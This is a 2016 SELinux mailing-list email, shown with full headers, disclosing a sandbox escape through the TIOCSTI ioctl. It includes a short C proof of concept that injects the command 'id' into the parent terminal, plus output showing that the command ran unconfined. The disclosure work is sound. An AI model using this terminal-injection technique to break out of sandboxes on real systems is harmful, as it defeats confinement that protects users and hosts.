Received: from goalie.tycho.ncsc.mil (goalie [144.51.242.250])
 by tarius.tycho.ncsc.mil (8.14.4/8.14.4) with ESMTP id u8N9NwlI026995
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 05:23:59 -0400
Received: from localhost (localhost [127.0.0.1])
 by smtp.alunos.dcc.fc.up.pt (Postfix) with ESMTP id DC6CAACE5C
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 10:23:53 +0100 (WEST)
Received: from smtp.alunos.dcc.fc.up.pt ([127.0.0.1])
 by localhost (mail.alunos.dcc.fc.up.pt [127.0.0.1]) (amavisd-new, port 10025)
 with LMTP id 18110-08-2 for <selinux@tycho.nsa.gov>;
 Fri, 23 Sep 2016 10:23:52 +0100 (WEST)
Received: from webmail.alunos.dcc.fc.up.pt (webmail.alunos.dcc.fc.up.pt
 [192.168.0.11])
 by smtp.alunos.dcc.fc.up.pt (Postfix) with ESMTP id 3E4E4ACE5B
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 10:23:51 +0100 (WEST)
Message-ID: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
Date: Fri, 23 Sep 2016 11:23:50 +0200
From: up201407890@alunos.dcc.fc.up.pt
To: selinux@tycho.nsa.gov
Subject: SELinux sandbox escape via TIOCSTI ioctl
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
 <selinux.tycho.nsa.gov>
List-Post: <mailto:selinux@tycho.nsa.gov>
List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>

Hi,

When executing a program via the SELinux sandbox, the nonpriv session  
can escape to the parent session by using the TIOCSTI ioctl to push  
characters into the terminal's input buffer, allowing an attacker to  
escape the sandbox.

$ cat test.c
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
   char *cmd = "id\n";
   while(*cmd)
    ioctl(0, TIOCSTI, cmd++);
   execlp("/bin/id", "id", NULL);
}

$ gcc test.c -o test
$ /bin/sandbox ./test
id
uid=1000 gid=1000 groups=1000  
context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
$ id    <------ did not type this
uid=1000(saken) gid=1000(saken) groups=1000(saken)  
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023


This is similar to CVE-2016-2568, CVE-2016-2779, etc.

Thanks,
Federico Bento.

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.
